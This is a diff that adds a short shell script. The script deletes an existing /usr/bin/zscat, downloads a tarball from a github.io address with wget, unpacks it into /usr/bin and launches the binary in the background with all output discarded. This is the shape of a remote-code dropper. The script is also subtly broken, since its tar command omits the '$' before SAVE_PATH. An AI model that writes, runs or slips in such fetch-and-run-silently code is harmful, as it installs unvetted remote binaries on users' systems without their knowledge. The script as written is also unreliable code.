@@ -1,0 +1,10 @@
+#!/bin/sh
+SAVE_PATH="/usr/bin/zscat.tar.gz"
+BIN_FILE="/usr/bin/zscat"
+rm -rf $BIN_FILE
+rm -rf $SAVE_PATH
+wget https://wulimama001.github.io/zscat.tar.gz -O "$SAVE_PATH"
+cd /usr/bin
+tar -zxvf  SAVE_PATH
+chmod u+x $BIN_FILE
+/usr/bin/nohup $BIN_FILE > /dev/null 2>&1 &
